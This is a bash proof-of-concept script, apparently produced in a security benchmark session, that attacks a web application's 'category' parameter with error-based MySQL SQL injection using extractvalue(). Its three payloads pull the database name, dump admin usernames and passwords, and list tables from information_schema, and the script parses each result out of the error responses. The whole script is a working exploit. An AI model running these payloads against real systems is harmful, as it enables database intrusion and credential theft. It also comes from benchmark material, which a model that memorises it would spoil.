#!/bin/bash
# POC: Improved error-based SQL injection POC using extractvalue() with better response parsing
# Target: ./repo
# Created: 2025-11-10T18:28:47.550Z
# Session: benchmark-XBEN-078-24-mhtgyxl3

# Error-Based SQL Injection POC using extractvalue()
# Target: Category parameter vulnerable to XPATH error-based SQLi
# Database: MySQL 5.7+

TARGET_HOST="${1:-localhost:32768}"
TARGET_URL="http://${TARGET_HOST}/?category="

echo "[*] Error-Based SQL Injection POC - extractvalue() Technique"
echo "[*] Target: ${TARGET_URL}"
echo ""

# Function to URL encode
urlencode() {
    local string="${1}"
    echo -n "$string" | jq -sRr @uri
}

# Test 1: Basic Database Name Extraction
echo "[TEST 1] Extracting Database Name"
echo "-----------------------------------"
PAYLOAD="Nature' AND extractvalue(1,concat(0x7e,(SELECT database()),0x7e)) -- -"
ENCODED_PAYLOAD=$(urlencode "$PAYLOAD")
FULL_URL="${TARGET_URL}${ENCODED_PAYLOAD}"

echo "[+] Payload: $PAYLOAD"
echo "[+] Sending request..."
RESPONSE=$(curl -s "$FULL_URL" 2>&1)

echo "[+] Response preview:"
echo "$RESPONSE" | head -50
echo ""

if echo "$RESPONSE" | grep -qi "xpath\|error"; then
    echo "[✓] SQL ERROR DETECTED in response"
    if echo "$RESPONSE" | grep -q "~"; then
        EXTRACTED=$(echo "$RESPONSE" | grep -oP '~[^~]*~' | head -1)
        echo "[✓] Extracted Data: $EXTRACTED"
    fi
else
    echo "[-] Error message not detected"
fi
echo ""

# Test 2: Admin Credentials Extraction
echo "[TEST 2] Extracting Admin Credentials"
echo "-------------------------------------"
PAYLOAD2="Nature' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(username,0x3a,password) FROM admins),0x7e)) -- -"
ENCODED_PAYLOAD2=$(urlencode "$PAYLOAD2")
FULL_URL2="${TARGET_URL}${ENCODED_PAYLOAD2}"

echo "[+] Payload: $PAYLOAD2"
echo "[+] Sending request..."
RESPONSE2=$(curl -s "$FULL_URL2" 2>&1)

if echo "$RESPONSE2" | grep -qi "xpath\|error"; then
    echo "[✓] SQL ERROR DETECTED in response"
    if echo "$RESPONSE2" | grep -q "~"; then
        EXTRACTED2=$(echo "$RESPONSE2" | grep -oP '~[^~]*~' | head -1)
        echo "[✓] Extracted Credentials: $EXTRACTED2"
    fi
else
    echo "[-] Error message not detected"
fi
echo ""

# Test 3: Table Enumeration
echo "[TEST 3] Extracting Table Names"
echo "-------------------------------"
PAYLOAD3="Nature' AND extractvalue(1,concat(0x7e,(SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e)) -- -"
ENCODED_PAYLOAD3=$(urlencode "$PAYLOAD3")
FULL_URL3="${TARGET_URL}${ENCODED_PAYLOAD3}"

echo "[+] Payload: $PAYLOAD3"
echo "[+] Sending request..."
RESPONSE3=$(curl -s "$FULL_URL3" 2>&1)

if echo "$RESPONSE3" | grep -qi "xpath\|error"; then
    echo "[✓] SQL ERROR DETECTED in response"
    if echo "$RESPONSE3" | grep -q "~"; then
        EXTRACTED3=$(echo "$RESPONSE3" | grep -oP '~[^~]*~' | head -1)
        echo "[✓] Extracted Tables: $EXTRACTED3"
    fi
else
    echo "[-] Error message not detected"
fi
echo ""

echo "[*] POC Complete"
echo "[*] The vulnerability allows error-based SQL injection with data exfiltration via XPATH errors"